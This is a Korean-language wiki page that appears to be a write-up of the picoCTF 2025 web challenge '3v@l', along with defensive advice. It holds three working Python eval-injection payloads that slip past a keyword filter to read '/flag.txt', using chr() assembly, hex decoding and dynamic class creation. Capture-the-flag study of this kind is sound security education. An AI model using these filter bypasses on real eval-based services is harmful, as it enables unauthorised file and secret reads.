---
title: 3v@l — picoCTF 2025 web writeup
created: 2026-06-14
updated: 2026-06-21
type: query
tags: [ctf, web, python, eval, research, writeup, injection, rce]
sources: [https://medium.com/@gbahenrijoel/picoctf-2025-web-3v-l-87fdd25094b4, https://medium.com/@adonisdavids52/picoctf-3v-l-challenge-write-up-37ae762d9715, https://www.youtube.com/watch?v=U5Glr81pXnM, https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/, https://hackmd.io/@fearnot/picoCTF_Web]
confidence: high
---

# 3v@l — picoCTF 2025 web writeup

> Python `eval()` 기반 계산기에서 키워드/정규식 필터를 우회해 `/flag.txt`를 읽는 picoCTF 2025 Web Exploitation 문제입니다.

## 참고 URL
- [medium.com](https://medium.com/@gbahenrijoel/picoctf-2025-web-3v-l-87fdd25094b4)
- [medium.com](https://medium.com/@adonisdavids52/picoctf-3v-l-challenge-write-up-37ae762d9715)
- [www.youtube.com](https://www.youtube.com/watch?v=U5Glr81pXnM)
- [blog.qz.sg](https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/)
- [hackmd.io](https://hackmd.io/@fearnot/picoCTF_Web)


## 1. 핵심 요약

- 이 문제는 **안전하지 않은 `eval()`** 과 **블랙리스트 필터**의 결합이 왜 취약한지 보여줍니다.
- 직접 `open('/flag.txt')` 같은 문자열을 넣으면 필터에 막히지만, 런타임에 문자열을 조립하면 우회가 가능합니다.
- 현재 wiki에서는 [[eval]], [[web-ctf-writeup-parser-template]], [[python-eval-regex-filter-bypass-ctf-patterns]]를 함께 보면 풀이 흐름이 잘 연결됩니다.

연결 개념: [[eval]], [[web-ctf-writeup-parser-template]], [[command-injection]], [[python-eval-regex-filter-bypass-ctf-patterns]]

## 2. 문제 흐름

| 단계 | 관찰 | 의미 |
|------|------|------|
| 1 | 계산기에 `7 * 7`을 넣으면 `49`가 반환됨 | 입력이 Python 표현식으로 처리됨 |
| 2 | `eval()` 및 위험 키워드가 블랙리스트로 막힘 | 직접적인 페이로드는 차단됨 |
| 3 | `.` / `/` / `.txt` 등 파일 경로 관련 문자열도 필터링됨 | 단순 경로 입력이 실패함 |
| 4 | 문자열을 런타임에 조립하면 필터 우회를 시도할 수 있음 | 동적 구성 필요 |
| 5 | 결과적으로 `/flag.txt`를 읽어 flag 획득 | 최종 성공 |

## 3. 대표 우회 방식

### 3.1 문자열 동적 조립
```python
# /flag.txt를 문자 단위로 조립해 필터를 우회하는 예시
open(''.join([chr(x) for x in [47, 102, 108, 97, 103, 46, 116, 120, 116]])).read()
```

### 3.2 hex 디코딩
```python
# hex 문자열을 런타임에 복원해 파일 경로를 숨기는 예시
bytes.fromhex('2f666c61672e747874').decode('utf-8')
```

### 3.3 동적 클래스 생성
```python
# 표현식의 반환값으로 파일 내용을 돌려주는 방식의 예시
type('dynamicClass', (object,), {'method':lambda self:open((bytes.fromhex('2f666c61672e747874').decode('utf-8'))).read()})().method()
```

## 4. 공격자 관점

1. 먼저 `eval()`이 실제로 실행되는지 확인합니다.
2. 필터가 막는 문자열과 문자를 분리해서 파악합니다.
3. 문자열을 조립하는 함수(`chr`, `join`, `bytes.fromhex`)를 조합합니다.
4. 결과가 stdout이 아니라 **반환값**인지 확인하고, 그에 맞게 payload를 설계합니다.

## 5. 방어자 관점

- `eval()` 대신 `ast.literal_eval()` 같은 안전한 파서를 사용합니다.
- 블랙리스트보다 allowlist를 사용합니다.
- 파일 접근은 허용된 경로만 열도록 제한합니다.
- `__builtins__`와 동적 import 사용을 최소화합니다.

## 6. 같이 보면 좋은 페이지

- [[eval]] — Python `eval()` 자체의 위험성
- [[web-ctf-writeup-parser-template]] — 파서/검증기 우회가 나오는 Web CTF 패턴
- [[command-injection]] — 문자열이 실행으로 이어지는 취약점 계열

## 7. 참고 소스

- [PICOCTF 2025–Web:3v@l. Bypassing Regex-Based Security Filters…](https://medium.com/@gbahenrijoel/picoctf-2025-web-3v-l-87fdd25094b4)
- [PicoCTF — 3v@l challenge Write-up](https://medium.com/@adonisdavids52/picoctf-3v-l-challenge-write-up-37ae762d9715)
- [PicoCTF 3v@l](https://www.youtube.com/watch?v=U5Glr81pXnM)
- [PicoCTF 2025 - Web Exploitation Writeups](https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/)
- [picoCTF Web writeup - HackMD](https://hackmd.io/@fearnot/picoCTF_Web)
